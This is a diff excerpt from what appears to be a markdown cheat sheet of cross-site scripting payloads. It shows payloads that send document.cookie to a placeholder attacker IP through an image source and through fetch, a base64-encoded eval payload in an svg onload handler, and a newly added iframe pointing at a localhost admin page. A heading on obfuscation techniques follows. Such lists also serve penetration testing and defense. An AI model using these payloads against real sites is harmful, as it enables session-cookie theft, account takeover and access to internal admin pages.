@@ -108,6 +108,7 @@
 -  ```username=<body onload=\"new Image().src='http://IP ADDRESS?c='+document.cookie;\">```
 
 -  ```fetch('http://IP ADDRESS/?c=' + document.cookie)``` ENCODE -> ```<svg onload="eval(atob('BASE64 ENCODE PAYLOAD'))">```
+- <iframe src="http://localhost:5000/admin"></iframe>
 
 ## Obfuscation Techniques
 - HTML entity encoding → `&#x0D;`
